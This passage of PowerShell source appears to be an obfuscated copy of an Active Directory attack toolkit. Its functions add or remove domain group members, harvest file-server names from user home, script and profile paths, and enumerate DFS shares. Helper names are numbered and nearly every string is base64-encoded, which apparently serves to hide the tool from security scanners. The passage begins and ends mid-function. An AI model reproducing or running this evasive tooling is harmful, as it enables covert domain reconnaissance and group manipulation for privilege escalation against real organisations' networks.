                        ${134} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcAQwBoAGEAbgBnAGUA'))) ${384}.ftimeLastOriginatingChange
                        ${134} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBzAEEAZABkAGUAZAA='))) (${384}.dwVersion / 2)
                        ${134} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcARABzAGEARABOAA=='))) ${384}.pszLastOriginatingDsaDN
                        ${134}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAG8AbQBhAGkAbgBHAHIAbwB1AHAATQBlAG0AYgBlAHIARABlAGwAZQB0AGUAZAA='))))
                        ${134}
                    }
                }
                else {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBEAGUAbABlAHQAZQBkAF0AIABFAHIAcgBvAHIAIAByAGUAdAByAGkAZQB2AGkAbgBnACAAJwBtAHMAZABzAC0AcgBlAHAAbAB2AGEAbAB1AGUAbQBlAHQAYQBkAGEAdABhACcAIABmAG8AcgAgACcAJAB7ADIANQA4AH0AJwA=')))
                }
            }
        }
    }
}
function Add-DomainGroupMember {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        ${210},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${383} = @{
            'Identity' = $Identity
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${383}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${383}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${382} = f110 @383
        if (${382}) {
            try {
                ${212} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity(${382}.Context, ${382}.Identity)
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBBAGQAZAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQByAHIAbwByACAAZgBpAG4AZABpAG4AZwAgAHQAaABlACAAZwByAG8AdQBwACAAaQBkAGUAbgB0AGkAdAB5ACAAJwAkAEkAZABlAG4AdABpAHQAeQAnACAAOgAgACQAXwA=')))
            }
        }
    }
    PROCESS {
        if (${212}) {
            ForEach (${204} in ${210}) {
                if (${204} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgArAFwAXAAuACsA')))) {
                    ${383}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${204}
                    ${381} = f110 @383
                    if (${381}) {
                        $UserIdentity = ${381}.Identity
                    }
                }
                else {
                    ${381} = ${382}
                    $UserIdentity = ${204}
                }
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBBAGQAZAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAQQBkAGQAaQBuAGcAIABtAGUAbQBiAGUAcgAgACcAJAB7ADIAMAA0AH0AJwAgAHQAbwAgAGcAcgBvAHUAcAAgACcAJABJAGQAZQBuAHQAaQB0AHkAJwA=')))
                ${204} = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity(${381}.Context, $UserIdentity)
                ${212}.Members.Add(${204})
                ${212}.Save()
            }
        }
    }
}
function Remove-DomainGroupMember {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        ${210},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${383} = @{
            'Identity' = $Identity
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${383}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${383}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${382} = f110 @383
        if (${382}) {
            try {
                ${212} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity(${382}.Context, ${382}.Identity)
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBSAGUAbQBvAHYAZQAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQByAHIAbwByACAAZgBpAG4AZABpAG4AZwAgAHQAaABlACAAZwByAG8AdQBwACAAaQBkAGUAbgB0AGkAdAB5ACAAJwAkAEkAZABlAG4AdABpAHQAeQAnACAAOgAgACQAXwA=')))
            }
        }
    }
    PROCESS {
        if (${212}) {
            ForEach (${204} in ${210}) {
                if (${204} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgArAFwAXAAuACsA')))) {
                    ${383}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${204}
                    ${381} = f110 @383
                    if (${381}) {
                        $UserIdentity = ${381}.Identity
                    }
                }
                else {
                    ${381} = ${382}
                    $UserIdentity = ${204}
                }
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBSAGUAbQBvAHYAZQAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAUgBlAG0AbwB2AGkAbgBnACAAbQBlAG0AYgBlAHIAIAAnACQAewAyADAANAB9ACcAIABmAHIAbwBtACAAZwByAG8AdQBwACAAJwAkAEkAZABlAG4AdABpAHQAeQAnAA==')))
                ${204} = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity(${381}.Context, $UserIdentity)
                ${212}.Members.Remove(${204})
                ${212}.Save()
            }
        }
    }
}
function f90 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        function f109 {
            Param([String]$Path)
            if ($Path -and ($Path.split('\\').Count -ge 3)) {
                ${380} = $Path.split('\\')[2]
                if (${380} -and (${380} -ne '')) {
                    ${380}
                }
            }
        }
        ${48} = @{
            'LDAPFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYAMwA2ADgAKQAoACEAKAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADIAKQApACgAfAAoAGgAbwBtAGUAZABpAHIAZQBjAHQAbwByAHkAPQAqACkAKABzAGMAcgBpAHAAdABwAGEAdABoAD0AKgApACgAcAByAG8AZgBpAGwAZQBwAGEAdABoAD0AKgApACkAKQA=')))
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQAsAHMAYwByAGkAcAB0AHAAYQB0AGgALABwAHIAbwBmAGkAbABlAHAAYQB0AGgA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            ForEach ($TargetDomain in $Domain) {
                ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $TargetDomain
                ${379} = f74 @48
                $(ForEach(${378} in ${379}.FindAll()) {if (${378}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQA=')))]) {f109(${378}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQA=')))])}if (${378}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBjAHIAaQBwAHQAcABhAHQAaAA=')))]) {f109(${378}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBjAHIAaQBwAHQAcABhAHQAaAA=')))])}if (${378}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAG8AZgBpAGwAZQBwAGEAdABoAA==')))]) {f109(${378}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAG8AZgBpAGwAZQBwAGEAdABoAA==')))])}}) | sort -Unique
            }
        }
        else {
            ${379} = f74 @48
            $(ForEach(${378} in ${379}.FindAll()) {if (${378}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQA=')))]) {f109(${378}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQA=')))])}if (${378}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBjAHIAaQBwAHQAcABhAHQAaAA=')))]) {f109(${378}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBjAHIAaQBwAHQAcABhAHQAaAA=')))])}if (${378}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAG8AZgBpAGwAZQBwAGEAdABoAA==')))]) {f109(${378}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAG8AZgBpAGwAZQBwAGEAdABoAA==')))])}}) | sort -Unique
        }
    }
}
function Get-DomainDFSShare {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        $Version = 'All'
    )
    BEGIN {
        ${48} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        function f108 {
            [CmdletBinding()]
            Param(
                [Byte[]]
                ${f18}
            )
            ${367} = ${f18}
            ${377} = [bitconverter]::ToUInt32(${367}[0..3],0)
            ${376} = [bitconverter]::ToUInt32(${367}[4..7],0)
            ${f1} = 8
            ${279} = @()
            for(${67}=1; ${67} -le ${376}; ${67}++){
                ${375} = ${f1}
                ${374} = ${f1} + 1
                ${373} = [bitconverter]::ToUInt16(${367}[${375}..${374}],0)
                ${372} = ${374} + 1
                ${371} = ${372} + ${373} - 1
                ${280} = [System.Text.Encoding]::Unicode.GetString(${367}[${372}..${371}])
                ${370} = ${371} + 1
                ${369} = ${370} + 3
                ${368} = [bitconverter]::ToUInt32(${367}[${370}..${369}],0)
                ${366} = ${369} + 1
                ${283} = ${366} + ${368} - 1
                ${316} = ${367}[${366}..${283}]
                switch -wildcard (${280}) {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABzAGkAdABlAHIAbwBvAHQA'))) {  }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABkAG8AbQBhAGkAbgByAG8AbwB0ACoA'))) {
                        ${365} = 0
                        ${362} = 15
                        ${363} = [byte[]]${316}[${365}..${362}]
                        ${364} = New-Object Guid(,${363}) 
                        ${361} = ${362} + 1
                        ${360} = ${361} + 1
                        ${359} = [bitconverter]::ToUInt16(${316}[${361}..${360}],0)
                        ${358} = ${360} + 1
                        ${357} = ${358} + ${359} - 1
                        ${281} = [System.Text.Encoding]::Unicode.GetString(${316}[${358}..${357}])
                        ${356} = ${357} + 1
                        ${355} = ${356} + 1
                        ${354} = [bitconverter]::ToUInt16(${316}[${356}..${355}],0)
                        ${352} = ${355} + 1
                        ${351} = ${352} + ${354} - 1
                        ${353} = [System.Text.Encoding]::Unicode.GetString(${316}[${352}..${351}])
                        ${350} = ${351} + 1
                        ${349} = ${350} + 3
                        ${f19} = [bitconverter]::ToUInt32(${316}[${350}..${349}],0)
                        ${347} = ${349} + 1
                        ${346} = ${347} + 3
                        ${348} = [bitconverter]::ToUInt32(${316}[${347}..${346}],0)
                        ${345} = ${346} + 1
                        ${344} = ${345} + 1
                        ${343} = [bitconverter]::ToUInt16(${316}[${345}..${344}],0)
                        ${341} = ${344} + 1
                        ${340} = ${341} + ${343} - 1
                        if (${343} -gt 0)  {
                            ${342} = [System.Text.Encoding]::Unicode.GetString(${316}[${341}..${340}])
                        }
                        ${338} = ${340} + 1
                        ${337} = ${338} + 7
                        ${339} = ${316}[${338}..${337}] 
                        ${335} = ${337} + 1
                        ${334} = ${335} + 7
                        ${336} = ${316}[${335}..${334}]
                        ${332} = ${334} + 1
                        ${331} = ${332} + 7
                        ${333} = ${316}[${332}..${331}]
                        ${330} = ${331}  + 1
                        ${329} = ${330} + 3
                        $version = [bitconverter]::ToUInt32(${316}[${330}..${329}],0)
                        ${328} = ${329} + 1
                        ${327} = ${328} + 3
                        ${326} = [bitconverter]::ToUInt32(${316}[${328}..${327}],0)
                        ${325} = ${327} + 1
                        ${324} = ${325} + ${326} - 1
                        ${289} = ${316}[${325}..${324}]
                        ${323} = ${324} + 1
                        ${322} = ${323} + 3
                        ${321} = [bitconverter]::ToUInt32(${316}[${323}..${322}],0)
                        ${319} = ${322} + 1
                        ${318} = ${319} + ${321} - 1
                        ${320} = ${316}[${319}..${318}]
                        ${315} = ${318} + 1
                        ${314} = ${315} + 3
                        ${317} = [bitconverter]::ToUInt32(${316}[${315}..${314}],0)
                        ${313} = 0
                        ${312} = ${313} + 3
                        ${311} = [bitconverter]::ToUInt32(${289}[${313}..${312}],0)
                        ${285} = ${312} + 1
                        for(${310}=1; ${310} -le ${311}; ${310}++){
                            ${308} = ${285}
                            ${307} = ${308} + 3
                            ${309} = [bitconverter]::ToUInt32(${289}[${308}..${307}],0)
                            ${305} = ${307} + 1
                            ${304} = ${305} + 7
                            ${306} = ${289}[${305}..${304}]
                            ${302} = ${304} + 1
                            ${301} = ${302} + 3
                            ${303} = [bitconverter]::ToUInt32(${289}[${302}..${301}],0)
                            ${299} = ${301} + 1
                            ${298} = ${299} + 3
                            ${300} = [bitconverter]::ToUInt32(${289}[${299}..${298}],0)
                            ${297} = ${298} + 1
                            ${296} = ${297} + 1
                            ${295} = [bitconverter]::ToUInt16(${289}[${297}..${296}],0)
                            ${294} = ${296} + 1
                            ${293} = ${294} + ${295} - 1
                            ${287} = [System.Text.Encoding]::Unicode.GetString(${289}[${294}..${293}])
                            ${292} = ${293} + 1
                            ${291} = ${292} + 1
                            ${290} = [bitconverter]::ToUInt16(${289}[${292}..${291}],0)
                            ${288} = ${291} + 1
                            ${284} = ${288} + ${290} - 1
                            ${286} = [System.Text.Encoding]::Unicode.GetString(${289}[${288}..${284}])
                            ${276} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQAewAyADgANwB9AFwAJAB7ADIAOAA2AH0A')))
                            ${285} = ${284} + 1
                        }
                    }
                }
                ${f1} = ${283} + 1
                ${282} = @{
                    'Name' = ${280}
                    'Prefix' = ${281}
                    'TargetList' = ${276}
                }
                ${279} += New-Object -TypeName PSObject -Property ${282}
                ${281} = $Null
                ${280} = $Null
                ${276} = $Null
            }
            ${278} = @()
            ${279} | % {
                if ($_.TargetList) {
                    $_.TargetList | % {
                        ${278} += $_.split('\')[2]
                    }
                }
            }
            ${278}
        }
        function f107 {
            [CmdletBinding()]
            Param(
                [String]
                $Domain,
                [String]
                $SearchBase,
                [String]
                $Server,
                [String]
                $SearchScope = 'Subtree',
                [Int]
                $ResultPageSize = 200,
                [Int]
                $ServerTimeLimit,
                [Switch]
                $Tombstone,
                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $Credential = [Management.Automation.PSCredential]::Empty
            )
            ${272} = f74 @PSBoundParameters
            if (${272}) {
                ${271} = @()
                ${272}.filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBsAGEAcwBzAD0AZgBUAEQAZgBzACkAKQA=')))
                try {
                    ${72} = ${272}.FindAll()
                    ${72} | ? {$_} | % {
                        $Properties = $_.Properties
                        ${277} = $Properties.remoteservername
                        ${f18} = $Properties.pkt
                        ${271} += ${277} | % {
                            try {
                                if ( $_.Contains('\') ) {
                                    New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARwBlAHQALQBEAG8AbQBhAGkAbgBEAEYAUwBTAGgAYQByAGUAVgAxACAAZQByAHIAbwByACAAaQBuACAAcABhAHIAcwBpAG4AZwAgAEQARgBTACAAcwBoAGEAcgBlACAAOgAgACQAXwA=')))
                            }
                        }
                    }
                    if (${72}) {
                        try { ${72}.dispose() }
                        catch {
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARwBlAHQALQBEAG8AbQBhAGkAbgBEAEYAUwBTAGgAYQByAGUAVgAxACAAZQByAHIAbwByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAGIAagBlAGMAdAA6ACAAJABfAA==')))
                        }
                    }
                    ${272}.dispose()
                    if (${f18} -and ${f18}[0]) {
                        f108 ${f18}[0] | % {
                            if ($_ -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgB1AGwAbAA=')))) {
                                New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_}
                            }
                        }
                    }
                }
                catch {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARwBlAHQALQBEAG8AbQBhAGkAbgBEAEYAUwBTAGgAYQByAGUAVgAxACAAZQByAHIAbwByACAAOgAgACQAXwA=')))
                }
                ${271} | sort -Unique -Property $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUwBlAHIAdgBlAHIATgBhAG0AZQA=')))
            }
        }
        function f106 {
            [CmdletBinding()]
            Param(
                [String]
                $Domain,
                [String]
                $SearchBase,
                [String]
                $Server,
                [String]
                $SearchScope = 'Subtree',
                [Int]
                $ResultPageSize = 200,
                [Int]
                $ServerTimeLimit,
                [Switch]
                $Tombstone,
                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $Credential = [Management.Automation.PSCredential]::Empty
            )
            ${272} = f74 @PSBoundParameters
            if (${272}) {
                ${271} = @()
                ${272}.filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBsAGEAcwBzAD0AbQBzAEQARgBTAC0ATABpAG4AawB2ADIAKQApAA==')))
                $Null = ${272}.PropertiesToLoad.AddRange(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAZgBzAC0AbABpAG4AawBwAGEAdABoAHYAMgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAEQARgBTAC0AVABhAHIAZwBlAHQATABpAHMAdAB2ADIA')))))
                try {
                    ${72} = ${272}.FindAll()
                    ${72} | ? {$_} | % {
                        $Properties = $_.Properties
                        ${276} = $Properties.'msdfs-targetlistv2'[0]
                        ${275} = [xml][System.Text.Encoding]::Unicode.GetString(${276}[2..(${276}.Length-1)])
                        ${271} += ${275}.targets.ChildNodes | % {
                            try {
                                ${273} = $_.InnerText
                                if ( ${273}.Contains('\') ) {
                                    ${274} = ${273}.split('\')[3]
                                    ${101} = $Properties.'msdfs-linkpathv2'[0]
                                    New-Object -TypeName PSObject -Property @{'Name'=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADIANwA0AH0AJAB7ADEAMAAxAH0A')));'RemoteServerName'=${273}.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARwBlAHQALQBEAG8AbQBhAGkAbgBEAEYAUwBTAGgAYQByAGUAVgAyACAAZQByAHIAbwByACAAaQBuACAAcABhAHIAcwBpAG4AZwAgAHQAYQByAGcAZQB0ACAAOgAgACQAXwA=')))
                            }
                        }
                    }
                    if (${72}) {
                        try { ${72}.dispose() }
                        catch {
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARQByAHIAbwByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAGIAagBlAGMAdAA6ACAAJABfAA==')))
                        }
                    }
                    ${272}.dispose()
                }
                catch {
